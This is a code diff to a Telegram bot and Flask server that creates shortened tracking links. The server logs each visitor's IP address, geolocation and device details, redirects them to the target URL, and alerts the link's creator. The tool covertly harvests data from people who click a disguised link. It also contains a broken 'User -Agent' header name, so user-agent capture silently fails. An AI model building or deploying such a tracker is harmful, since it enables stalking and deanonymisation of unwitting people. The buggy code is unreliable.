@@ -78,10 +78,14 @@ async def track(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # Create the tracking URL
     tracking_url = f"{WEBHOOK_HOST}/{token}"
-    
+    logging.info(f"Original Tracking URL: {tracking_url}")
+
     # Shorten the tracking URL
     shortened_tracking_url = shorten_url(tracking_url)
-    logging.info(f"New tracking link created by {update.effective_user.id}: {shortened_tracking_url}")
+    logging.info(f"Shortened Tracking URL: {shortened_tracking_url}")
+
+    if shortened_tracking_url == tracking_url:
+        logging.warning("Shortening failed, using original tracking URL.")
 
     await update.message.reply_text(
         f"✅ Tracking link created\n\n"
@@ -98,15 +102,16 @@ def home():
 @app.route('/<token>', methods=['GET'])
 def track_visit(token):
     if token not in tracking_data:
+        logging.error(f"Invalid tracking link accessed: {token}")
         return Response("Invalid tracking link", status=404)
 
     try:
         visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
-        user_agent = request.headers.get('User  -Agent', 'Unknown')
+        user_agent = request.headers.get('User -Agent', 'Unknown')
         timestamp = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
 
-        ip_info = get_ip_info(visitor_ip)
-        device_info = get_device_info(user_agent)
+        ip_info = get_ip_info(visitor_ip)  # Ensure this function is defined
+        device_info = get_device_info(user_agent)  # Ensure this function is defined
 
         visit_data = {
             "timestamp": timestamp,
@@ -135,7 +140,7 @@ def track_visit(token):
         return redirect(tracking_data[token]['target_url'], code=302)
 
     except Exception as e:
-        logging.error(f"Error processing visit: {str(e)}")
+        logging.error(f"Error processing visit for token {token}: {str(e)}")
         return Response("Internal server error", status=500)
 
 async def send_telegram_alert(token, visit_data):
